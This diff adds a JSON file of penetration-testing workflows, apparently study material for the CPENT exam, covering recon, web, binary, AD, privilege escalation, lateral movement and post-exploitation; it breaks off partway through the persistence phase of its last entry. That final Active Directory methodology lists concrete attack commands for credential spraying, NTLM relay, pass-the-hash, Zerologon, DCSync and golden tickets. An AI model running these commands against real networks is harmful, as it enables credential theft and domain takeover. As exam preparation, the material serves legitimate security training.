@@ -1,0 +1,3895 @@
+[
+  {
+    "id": "recon-workflow",
+    "zone": "recon",
+    "name": "Standard Reconnaissance Workflow",
+    "description": "Complete reconnaissance methodology from passive information gathering to active scanning.",
+    "steps": [
+      {
+        "phase": "Passive Recon",
+        "techniques": [
+          "passive-recon"
+        ],
+        "tools": [
+          "subfinder",
+          "amass",
+          "httpx"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Domain is known",
+            "action": "Run passive subdomain enumeration with subfinder and amass",
+            "fallback": "Use search engines and Shodan for IP-based targets"
+          }
+        ]
+      },
+      {
+        "phase": "Active Scanning",
+        "techniques": [],
+        "tools": [
+          "nmap",
+          "masscan",
+          "naabu"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Large subnet (>/24)",
+            "action": "Use masscan for initial port discovery then nmap for detailed scanning",
+            "fallback": "Use nmap with -T4 for smaller ranges"
+          }
+        ]
+      },
+      {
+        "phase": "Service Enumeration",
+        "techniques": [],
+        "tools": [
+          "nmap",
+          "httpx"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Web servers found",
+            "action": "Run httpx for tech detection and directory enumeration",
+            "fallback": "Proceed to zone-specific enumeration"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master Standard Reconnaissance Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# Standard Reconnaissance Workflow\n# Zone: recon\n# Steps: 3\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "ad-workflow",
+    "zone": "active-directory",
+    "name": "Active Directory Compromise Workflow",
+    "description": "Standard methodology for enumerating and compromising Active Directory environments.",
+    "steps": [
+      {
+        "phase": "Initial Enumeration",
+        "techniques": [
+          "smb-enumeration",
+          "asrep-roasting"
+        ],
+        "tools": [
+          "enum4linux",
+          "smbmap",
+          "rpcclient",
+          "kerbrute"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SMB port (445) is open",
+            "action": "Run enum4linux-ng and rpcclient for unauthenticated enumeration",
+            "fallback": "Check LDAP (389) for anonymous bind"
+          },
+          {
+            "condition": "Valid usernames found",
+            "action": "Test for AS-REP roasting and Kerberoasting",
+            "fallback": "Proceed to SMB enumeration with credentials"
+          }
+        ]
+      },
+      {
+        "phase": "Credential Acquisition",
+        "techniques": [
+          "kerberoasting",
+          "asrep-roasting",
+          "pass-the-hash"
+        ],
+        "tools": [
+          "impacket",
+          "kerbrute",
+          "hashcat"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Service account SPNs found",
+            "action": "Perform Kerberoasting to obtain crackable hashes",
+            "fallback": "Try AS-REP roasting if pre-auth is disabled"
+          },
+          {
+            "condition": "Hashes obtained but not cracked",
+            "action": "Run hashcat with rockyou.txt and best64 rules",
+            "fallback": "Try Pass-the-Hash directly if NTLM hashes obtained"
+          }
+        ]
+      },
+      {
+        "phase": "Lateral Movement",
+        "techniques": [
+          "pass-the-hash",
+          "dcsync"
+        ],
+        "tools": [
+          "crackmapexec",
+          "evil-winrm",
+          "impacket"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Valid credentials or hashes obtained",
+            "action": "Use CrackMapExec to spray credentials across network",
+            "fallback": "Use Evil-WinRM for hosts with WinRM enabled"
+          },
+          {
+            "condition": "Domain Admin access achieved",
+            "action": "Perform DCSync to extract all domain hashes",
+            "fallback": "Create golden ticket for persistent access"
+          }
+        ]
+      },
+      {
+        "phase": "Persistence",
+        "techniques": [
+          "golden-ticket",
+          "dcsync"
+        ],
+        "tools": [
+          "mimikatz",
+          "certipy"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "KRBTGT hash obtained",
+            "action": "Create golden ticket for persistent DA access",
+            "fallback": "Create silver ticket for specific service access"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master Active Directory Compromise Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# Active Directory Compromise Workflow\n# Zone: active-directory\n# Steps: 4\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "web-workflow",
+    "zone": "web",
+    "name": "Web Application Testing Workflow",
+    "description": "Systematic approach to web application penetration testing following OWASP methodology.",
+    "steps": [
+      {
+        "phase": "Reconnaissance",
+        "techniques": [],
+        "tools": [
+          "nmap",
+          "gobuster",
+          "ffuf",
+          "wpscan",
+          "nuclei"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Web server identified",
+            "action": "Run technology detection and directory brute forcing",
+            "fallback": "Use WhatWeb and Wappalyzer for tech identification"
+          },
+          {
+            "condition": "WordPress detected",
+            "action": "Run WPScan for vulnerability enumeration",
+            "fallback": "Proceed with generic web testing"
+          }
+        ]
+      },
+      {
+        "phase": "Vulnerability Scanning",
+        "techniques": [
+          "sql-injection",
+          "xss",
+          "ssrf",
+          "file-inclusion"
+        ],
+        "tools": [
+          "nikto",
+          "nuclei",
+          "burp-suite"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Parameters found in URLs",
+            "action": "Test for SQL injection with sqlmap",
+            "fallback": "Manual testing with Burp Suite Repeater"
+          },
+          {
+            "condition": "File upload functionality found",
+            "action": "Test for file upload vulnerabilities and bypasses",
+            "fallback": "Check for path traversal in file parameters"
+          }
+        ]
+      },
+      {
+        "phase": "Exploitation",
+        "techniques": [
+          "sql-injection",
+          "xss",
+          "ssrf",
+          "file-inclusion"
+        ],
+        "tools": [
+          "sqlmap",
+          "burp-suite"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SQL injection confirmed",
+            "action": "Dump database with sqlmap --dump-all",
+            "fallback": "Try OS shell if database privileges allow"
+          },
+          {
+            "condition": "XSS confirmed",
+            "action": "Deploy XSS payload to steal cookies or execute actions",
+            "fallback": "Try XSS-based phishing if stored XSS found"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master Web Application Testing Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# Web Application Testing Workflow\n# Zone: web\n# Steps: 3\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "binary-workflow",
+    "zone": "binary-exploitation",
+    "name": "Binary Exploitation Workflow",
+    "description": "Systematic approach to binary exploitation from analysis to shellcode execution.",
+    "steps": [
+      {
+        "phase": "Initial Analysis",
+        "techniques": [],
+        "tools": [
+          "checksec",
+          "file",
+          "radare2"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Binary is 64-bit ELF",
+            "action": "Check security protections with checksec",
+            "fallback": "Check with file command and radare2"
+          }
+        ]
+      },
+      {
+        "phase": "Vulnerability Identification",
+        "techniques": [
+          "buffer-overflow",
+          "format-string"
+        ],
+        "tools": [
+          "gdb",
+          "pwntools",
+          "checksec"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Stack canary disabled",
+            "action": "Test for buffer overflow with cyclic pattern",
+            "fallback": "Check for format string vulnerabilities"
+          },
+          {
+            "condition": "Crash with SIGSEGV found",
+            "action": "Find offset with pattern_offset and control EIP",
+            "fallback": "Fuzz with different payload sizes"
+          }
+        ]
+      },
+      {
+        "phase": "Exploitation",
+        "techniques": [
+          "buffer-overflow",
+          "rop-chain",
+          "shellcode-development"
+        ],
+        "tools": [
+          "pwntools",
+          "ropper",
+          "one_gadget",
+          "gdb"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "NX/DEP enabled, no stack execution",
+            "action": "Find ROP gadgets with ropper",
+            "fallback": "Try one_gadget if libc is available"
+          },
+          {
+            "condition": "ASLR enabled",
+            "action": "Use ret2plt or information leak for addresses",
+            "fallback": "Try partial RELRO bypass"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master Binary Exploitation Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# Binary Exploitation Workflow\n# Zone: binary-exploitation\n# Steps: 3\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "iot-workflow",
+    "zone": "iot-firmware",
+    "name": "IoT Firmware Analysis Workflow",
+    "description": "Methodology for analyzing IoT device firmware for vulnerabilities.",
+    "steps": [
+      {
+        "phase": "Firmware Acquisition",
+        "techniques": [
+          "firmware-extraction"
+        ],
+        "tools": [
+          "binwalk",
+          "firmware-mod-kit"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Firmware file available",
+            "action": "Analyze with binwalk and extract filesystem",
+            "fallback": "Download firmware from vendor website"
+          }
+        ]
+      },
+      {
+        "phase": "Static Analysis",
+        "techniques": [
+          "firmware-extraction"
+        ],
+        "tools": [
+          "binwalk",
+          "gdb",
+          "qemu"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Filesystem extracted",
+            "action": "Analyze /etc/passwd, /etc/shadow, web interfaces, scripts",
+            "fallback": "Use sasquatch if standard extraction fails"
+          }
+        ]
+      },
+      {
+        "phase": "Emulation",
+        "techniques": [],
+        "tools": [
+          "qemu",
+          "binwalk"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Architecture identified (MIPS, ARM, etc.)",
+            "action": "Set up QEMU emulation for dynamic analysis",
+            "fallback": "Use chroot or firmware-mod-kit for static analysis"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master IoT Firmware Analysis Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# IoT Firmware Analysis Workflow\n# Zone: iot-firmware\n# Steps: 3\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "privesc-workflow",
+    "zone": "privilege-escalation",
+    "name": "Privilege Escalation Workflow",
+    "description": "Systematic approach to escalating privileges on Linux and Windows systems.",
+    "steps": [
+      {
+        "phase": "Information Gathering",
+        "techniques": [],
+        "tools": [
+          "linpeas",
+          "winpeas",
+          "linenum"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Linux target",
+            "action": "Run LinPEAS for comprehensive enumeration",
+            "fallback": "Run LinEnum for lighter enumeration"
+          },
+          {
+            "condition": "Windows target",
+            "action": "Run WinPEAS or PowerUp",
+            "fallback": "Manual enumeration of services, scheduled tasks, and registry"
+          }
+        ]
+      },
+      {
+        "phase": "Exploitation",
+        "techniques": [
+          "suid-abuse",
+          "sudo-misconfiguration",
+          "cron-jobs"
+        ],
+        "tools": [
+          "linpeas",
+          "powerup"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SUID binaries found",
+            "action": "Check GTFOBins for exploitation techniques",
+            "fallback": "Check for writable cron jobs or services"
+          },
+          {
+            "condition": "Sudo misconfiguration found",
+            "action": "Exploit with NOPASSWD entry or path traversal",
+            "fallback": "Check for kernel exploits"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master Privilege Escalation Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# Privilege Escalation Workflow\n# Zone: privilege-escalation\n# Steps: 2\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "lateral-movement-workflow",
+    "zone": "lateral-movement",
+    "name": "Lateral Movement Workflow",
+    "description": "Methodology for moving between compromised hosts across network segments.",
+    "steps": [
+      {
+        "phase": "Tunnel Setup",
+        "techniques": [
+          "pivoting"
+        ],
+        "tools": [
+          "chisel",
+          "ligolo-ng"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Shell on pivot host available",
+            "action": "Upload and run Chisel or Ligolo agent",
+            "fallback": "Use SSH tunnels if SSH is available"
+          }
+        ]
+      },
+      {
+        "phase": "Credential Reuse",
+        "techniques": [
+          "password-spraying"
+        ],
+        "tools": [
+          "crackmapexec",
+          "hydra"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Credentials obtained from previous host",
+            "action": "Spray credentials across network with CrackMapExec",
+            "fallback": "Try Pass-the-Hash with collected NTLM hashes"
+          }
+        ]
+      },
+      {
+        "phase": "Access Internal Resources",
+        "techniques": [],
+        "tools": [
+          "proxychains4",
+          "socat"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SOCKS proxy established",
+            "action": "Route tools through proxy with proxychains4",
+            "fallback": "Use socat for TCP relay if needed"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master Lateral Movement Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# Lateral Movement Workflow\n# Zone: lateral-movement\n# Steps: 3\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "password-attacks-workflow",
+    "zone": "password-attacks",
+    "name": "Password Attack Workflow",
+    "description": "Systematic approach to cracking and brute forcing passwords.",
+    "steps": [
+      {
+        "phase": "Hash Identification",
+        "techniques": [
+          "hash-cracking"
+        ],
+        "tools": [
+          "hashcat",
+          "john"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Hash type unknown",
+            "action": "Use hash-identifier or hashcat --example to identify",
+            "fallback": "Try common modes (0 for MD5, 1000 for NTLM, 3200 for bcrypt)"
+          }
+        ]
+      },
+      {
+        "phase": "Wordlist Attack",
+        "techniques": [
+          "hash-cracking"
+        ],
+        "tools": [
+          "hashcat",
+          "john"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Standard wordlist fails",
+            "action": "Apply rules (best64, d3ad0ne) and try larger wordlists",
+            "fallback": "Generate targeted wordlists from gathered information"
+          }
+        ]
+      },
+      {
+        "phase": "Brute Force",
+        "techniques": [
+          "password-spraying"
+        ],
+        "tools": [
+          "hydra",
+          "kerbrute"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Online service accessible",
+            "action": "Use Hydra for brute force with throttling",
+            "fallback": "Try password spraying with common passwords"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master Password Attack Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# Password Attack Workflow\n# Zone: password-attacks\n# Steps: 3\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "post-exploitation-workflow",
+    "zone": "post-exploitation",
+    "name": "Post-Exploitation Workflow",
+    "description": "Methodology for post-exploitation activities including credential harvesting, persistence, and C2.",
+    "steps": [
+      {
+        "phase": "Credential Harvesting",
+        "techniques": [
+          "credential-harvesting"
+        ],
+        "tools": [
+          "mimikatz",
+          "impacket"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Windows target with elevated access",
+            "action": "Dump LSASS memory with Mimikatz or secretsdump",
+            "fallback": "Extract credentials from browsers and files"
+          }
+        ]
+      },
+      {
+        "phase": "Persistence",
+        "techniques": [
+          "persistence"
+        ],
+        "tools": [
+          "metasploit",
+          "powershell"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Windows target",
+            "action": "Create scheduled task or registry run key",
+            "fallback": "Add SSH key on Linux targets"
+          }
+        ]
+      },
+      {
+        "phase": "C2 Establishment",
+        "techniques": [
+          "c2-establishment"
+        ],
+        "tools": [
+          "metasploit",
+          "empire",
+          "covenant"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Outbound internet access available",
+            "action": "Deploy C2 agent (Meterpreter, Empire, Covenant)",
+            "fallback": "Use DNS or HTTP C2 over common ports"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master Post-Exploitation Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# Post-Exploitation Workflow\n# Zone: post-exploitation\n# Steps: 3\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "exploitation-workflow",
+    "zone": "exploitation-frameworks",
+    "name": "Exploitation Framework Workflow",
+    "description": "Use automated exploitation frameworks for reliable, repeatable attacks.",
+    "steps": [
+      {
+        "phase": "Exploit Search",
+        "techniques": [],
+        "tools": [
+          "searchsploit",
+          "nuclei"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Software version identified",
+            "action": "Search Exploit-DB with searchsploit",
+            "fallback": "Search Nuclei templates for the service"
+          }
+        ]
+      },
+      {
+        "phase": "Exploitation",
+        "techniques": [
+          "metasploit-exploitation"
+        ],
+        "tools": [
+          "metasploit",
+          "searchsploit"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Metasploit module available",
+            "action": "Configure and launch exploit with msfconsole",
+            "fallback": "Use standalone exploit from Exploit-DB"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master Exploitation Framework Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# Exploitation Framework Workflow\n# Zone: exploitation-frameworks\n# Steps: 2\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "reporting-workflow",
+    "zone": "reporting",
+    "name": "Reporting and Documentation Workflow",
+    "description": "Document findings and generate professional penetration test reports.",
+    "steps": [
+      {
+        "phase": "Evidence Collection",
+        "techniques": [
+          "reporting-screenshots"
+        ],
+        "tools": [
+          "flameshot",
+          "aquatone",
+          "eyewitness"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Web services discovered",
+            "action": "Run Aquatone or EyeWitness for automated screenshots",
+            "fallback": "Use Flameshot for manual annotated screenshots"
+          }
+        ]
+      },
+      {
+        "phase": "Note Organization",
+        "techniques": [],
+        "tools": [
+          "cherrytree"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Multiple findings across many hosts",
+            "action": "Use CherryTree or similar for organized note-taking",
+            "fallback": "Use markdown files organized by zone"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master Reporting and Documentation Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# Reporting and Documentation Workflow\n# Zone: reporting\n# Steps: 2\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "network-enum-workflow",
+    "zone": "network-enum",
+    "name": "Network Enumeration Workflow",
+    "description": "Comprehensive network discovery and enumeration methodology.",
+    "steps": [
+      {
+        "phase": "Live Host Discovery",
+        "techniques": [
+          "arp-discovery"
+        ],
+        "tools": [
+          "nmap",
+          "masscan",
+          "netdiscover",
+          "arp-scan"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "ICMP allowed",
+            "action": "Use nmap ping sweep for live host discovery",
+            "fallback": "Use ARP scan or TCP SYN ping"
+          }
+        ]
+      },
+      {
+        "phase": "Port Scanning",
+        "techniques": [],
+        "tools": [
+          "nmap",
+          "naabu",
+          "masscan"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Large subnet (>/24)",
+            "action": "Use masscan for initial discovery then nmap for detail",
+            "fallback": "Use nmap with -T4 for smaller ranges"
+          }
+        ]
+      },
+      {
+        "phase": "Service Enumeration",
+        "techniques": [
+          "snmp-enumeration"
+        ],
+        "tools": [
+          "nmap",
+          "smbmap",
+          "enum4linux",
+          "snmpwalk"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SNMP open (UDP 161)",
+            "action": "Enumerate SNMP community strings and walk MIB",
+            "fallback": "Proceed with SMB, HTTP, SSH enumeration"
+          }
+        ]
+      }
+    ],
+    "examHabits": [
+      "Master Network Enumeration Workflow methodology. Time yourself — CPENT gives 24h. Document every step."
+    ],
+    "quickRef": "# Network Enumeration Workflow\n# Zone: network-enum\n# Steps: 3\n# Key tools: see steps below",
+    "source": "cpent-reference"
+  },
+  {
+    "id": "ad-argha-dey-methodology",
+    "zone": "active-directory",
+    "name": "Argha Dey Active Directory Attack Methodology",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "10-phase AD methodology: Recon → Enumeration → Foothold → Credential Access → PrivEsc → Lateral Movement → Domain Dominance → Persistence. Includes per-host quick reference and mental checklist before calling a box 'owned'.",
+    "examHabits": [
+      "Confirm domain name, forest, DC(s) before exploitation",
+      "Enumerate all users/groups/computers",
+      "Check for Kerberoastable / ASREPRoastable accounts",
+      "Check SMB signing + null session exposure",
+      "Check trusts (direction, type, foreign principals)",
+      "Check delegation (unconstrained/constrained/RBCD)",
+      "Check GPP/SYSVOL for cached creds",
+      "Attempt DCSync if privileged",
+      "Extract flags / persistence artifacts as required",
+      "Document every credential + hash found (reused across trusts often)"
+    ],
+    "quickRef": "nxc smb <range>; impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat; kerberoasting with GetUserSPNs; DCSync via secretsdump -just-dc",
+    "steps": [
+      {
+        "phase": "Phase 1 - Passive & Semi-Passive Recon",
+        "techniques": [
+          "passive-recon",
+          "dns-enumeration"
+        ],
+        "tools": [
+          "nxc",
+          "nmap",
+          "nslookup",
+          "dig",
+          "enum4linux"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "AD network range known",
+            "action": "nxc smb <range> OR crackmapexec smb <range> - master map: IP, hostname, OS, domain, SMB signing, SMBv1",
+            "fallback": "nmap -p 88,389,445,3268 --open -T4 <range>"
+          },
+          {
+            "condition": "Domain name identified",
+            "action": "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>; nslookup -type=SRV _kerberos._tcp.<domain>; dig axfr @<dns-ip> <domain>",
+            "fallback": "Proceed to RPC-based enumeration"
+          },
+          {
+            "condition": "Suspected DC port combo (88+389+445)",
+            "action": "nmap --script smb-os-discovery -p445; nmap --script rdp-ntlm-info -p3389; nmap --script smtp-ntlm-info -p25; ldapsearch -x -H ldap://<dc-ip> -s base namingcontexts",
+            "fallback": "Use rpcclient null session for info leak"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 2 - Unauthenticated / Null-Session Enumeration",
+        "techniques": [
+          "smb-enumeration"
+        ],
+        "tools": [
+          "rpcclient",
+          "smbclient",
+          "enum4linux",
+          "kerbrute",
+          "nxc"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SMB/LDAP open with no creds",
+            "action": "rpcclient -U '' -N <dc-ip> then enumdomusers, enumdomgroups, querydominfo, enumtrust, lsaenumsid",
+            "fallback": "smbclient -L //<target> -N; enum4linux-ng -A <target>"
+          },
+          {
+            "condition": "Valid usernames needed (lockout-safe)",
+            "action": "kerbrute userenum -d <domain> --dc <dc-ip> usernames.txt",
+            "fallback": "nmap -p88 --script krb5-enum-users with realm arg"
+          },
+          {
+            "condition": "ASREPRoastable accounts suspected",
+            "action": "impacket-GetNPUsers <domain>/ -usersfile usernames.txt -no-pass -format hashcat -outputfile asrep.txt; hashcat -m 18200 asrep.txt rockyou.txt",
+            "fallback": "Check userAccountControl flag 4194304 via LDAP search"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 3 - Credential Gathering (Spraying & Poisoning)",
+        "techniques": [
+          "password-spraying",
+          "kerberoasting",
+          "asrep-roasting",
+          "llmnr-poisoning"
+        ],
+        "tools": [
+          "nxc",
+          "crackmapexec",
+          "hydra",
+          "responder",
+          "hashcat",
+          "kerbrute"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Userlist obtained",
+            "action": "nxc smb <target/range> -u users.txt -p passwords.txt --continue-on-success",
+            "fallback": "crackmapexec smb <target> -u users.txt -p 'Season2026!' --continue-on-success"
+          },
+          {
+            "condition": "Other protocols (RDP/LDAP)",
+            "action": "hydra -L users.txt -P passwords.txt rdp://<target>; kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Password123!'",
+            "fallback": "Responder -I eth0 -wrf for LLMNR/NBT-NS poisoning; hashcat -m 5600 hash.txt rockyou.txt"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 4 - NTLM Relay (Signing Not Required)",
+        "techniques": [
+          "ntlm-relay"
+        ],
+        "tools": [
+          "impacket",
+          "responder",
+          "nxc",
+          "nmap"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SMB signing not required",
+            "action": "Check signing state: nmap --script smb2-security-mode; if not required, ntlmrelayx.py -tf targets.txt -smb2support",
+            "fallback": "Use Responder with SMB server disabled, relay captured hashes live"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 5 - Authenticated Enumeration (LDAP Deep Dive)",
+        "techniques": [
+          "kerberoasting",
+          "asrep-roasting",
+          "delegation-enum"
+        ],
+        "tools": [
+          "ldapsearch",
+          "impacket",
+          "bloodhound",
+          "nmap"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Valid credentials obtained",
+            "action": "ldapsearch for users, computers, groups, SPNs, trusts, delegation, foreignSecurityPrincipals, GPOs/OUs, password-in-description",
+            "fallback": "impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <dc-ip> -request"
+          },
+          {
+            "condition": "Attack path mapping needed",
+            "action": "bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <dc-ip> -c All; load .json into BloodHound GUI",
+            "fallback": "PowerView: Get-DomainUser -SPN; Get-DomainUser -PreauthNotRequired; Find-InterestingDomainAcl; Get-DomainTrust"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 6 - Foothold & Shell (Impacket Suite, PtH)",
+        "techniques": [
+          "pass-the-hash",
+          "pass-the-ticket",
+          "overpass-the-hash"
+        ],
+        "tools": [
+          "impacket",
+          "nxc",
+          "evil-winrm",
+          "bloodhound",
+          "mimikatz"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Valid credentials (plaintext)",
+            "action": "impacket-psexec <domain>/<user>:'<pass>'@<target>; impacket-wmiexec (quieter); impacket-smbexec",
+            "fallback": "evil-winrm -i <target> -u <user> -p '<pass>'"
+          },
+          {
+            "condition": "NTLM hash only (no plaintext)",
+            "action": "impacket-psexec -hashes :<NTLM-hash> <domain>/<user>@<target>; nxc smb <target> -u <user> -H <NTLM-hash>",
+            "fallback": "evil-winrm -i <target> -u <user> -H <NTLM-hash>"
+          },
+          {
+            "condition": "Kerberoastable/TGT available",
+            "action": "impacket-getTGT <domain>/<user> -hashes :<NTLM-hash>; export KRB5CCNAME=<user>.ccache; impacket-psexec -k -no-pass <domain>/<user>@<target>",
+            "fallback": "xfreerdp3 /u:<user> /p:'<pass>' /v:<target> /cert:ignore +clipboard /dynamic-resolution"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 7 - Local Privilege Escalation (Windows)",
+        "techniques": [
+          "always-install-elevated",
+          "unquoted-service-paths",
+          "dll-hijacking",
+          "token-impersonation",
+          "gpp-cached-passwords"
+        ],
+        "tools": [
+          "powerup",
+          "winpeas",
+          "seatbelt",
+          "mimikatz",
+          "accesschk"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Low-priv shell on Windows",
+            "action": "systeminfo; whoami /priv; whoami /groups; wmic qfe get HotFixID; winPEAS.exe; PowerUp Invoke-AllChecks",
+            "fallback": "Manual: check AlwaysInstallElevated, unquoted paths, weak service perms, scheduled tasks"
+          },
+          {
+            "condition": "SeImpersonatePrivilege = Enabled",
+            "action": "PrintSpoofer.exe -c cmd or GodPotato.exe -cmd 'C:\\payload.exe'",
+            "fallback": "JuicyPotato -l 1337 -p C:\\payload.exe -t * -c {CLSID}"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 8 - Domain Privilege Escalation",
+        "techniques": [
+          "kerberoasting",
+          "acl-abuse-genericall",
+          "acl-abuse-forcechangepassword",
+          "unconstrained-delegation",
+          "constrained-delegation-s4u",
+          "rbcd-attack",
+          "gpo-abuse"
+        ],
+        "tools": [
+          "impacket",
+          "mimikatz",
+          "certipy",
+          "bloodhound",
+          "powerview"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "SPN account with weak creds is privileged",
+            "action": "Kerberoast → crack hashcat -m 13100 → instant domain compromise",
+            "fallback": "ACL abuse via BloodHound path"
+          },
+          {
+            "condition": "GenericAll on user",
+            "action": "Set-ADAccountPassword -Identity <target> -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)",
+            "fallback": "GenericAll on group: Add-ADGroupMember"
+          },
+          {
+            "condition": "Unconstrained delegation host compromised",
+            "action": "Force DC auth via PrinterBug/PetitPotam; capture TGT with mimikatz sekurlsa::tickets /export",
+            "fallback": "Constrained delegation: impacket-getST -spn <svc> -impersonate administrator"
+          },
+          {
+            "condition": "RBCD path via BloodHound",
+            "action": "impacket-rbcd -delegate-from '<attacker>$' -delegate-to '<target>$' -action write; then impacket-getST -spn cifs/<target-fqdn> -impersonate administrator",
+            "fallback": "ADCS abuse: certipy find; certipy req -template <vuln-template>; certipy auth -pfx <cert>.pfx"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 9 - Lateral Movement & Domain Dominance",
+        "techniques": [
+          "pass-the-hash",
+          "pass-the-ticket",
+          "dcsync",
+          "overpass-the-hash"
+        ],
+        "tools": [
+          "crackmapexec",
+          "evil-winrm",
+          "impacket",
+          "nxc",
+          "mimikatz"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Valid creds or hashes obtained",
+            "action": "CrackMapExec / nxc to spray credentials across network; Evil-WinRM for WinRM-enabled hosts",
+            "fallback": "Pass-the-Hash with -hashes flag"
+          },
+          {
+            "condition": "Domain Admin access achieved",
+            "action": "impacket-secretsdump -just-dc <domain>/<user>:'<pass>'@<dc-ip> to extract all domain hashes",
+            "fallback": "DCSync via Mimikatz: lsadump::dcsync /domain:<domain> /user:krbtgt"
+          },
+          {
+            "condition": "CVE-based domain compromise applicable",
+            "action": "Zerologon (CVE-2020-1472): python3 cve-2020-1472-exploit.py <DC_NAME> <DC_IP> then secretsdump -no-pass; PrintNightmare (CVE-2021-1675)",
+            "fallback": "noPac.py -shell for SAMAccountName spoofing; PetitPotam for NTLM coerce → relay to ADCS"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 10 - Persistence",
+        "techniques": [
+          "golden-ticket",
+          "silver-ticket",
+          "skeleton-key",
+          "gpp-abuse"
+        ],
+        "tools": [
+          "mimikatz",
+          "impacket",
+          "certipy"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "KRBTGT hash obtained (via DCSync)",
+            "action": "mimikatz kerberos::golden /user:administrator /domain:<domain> /sid:<domain-sid> /krbtgt:<hash> /ptt OR impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain <domain> administrator",
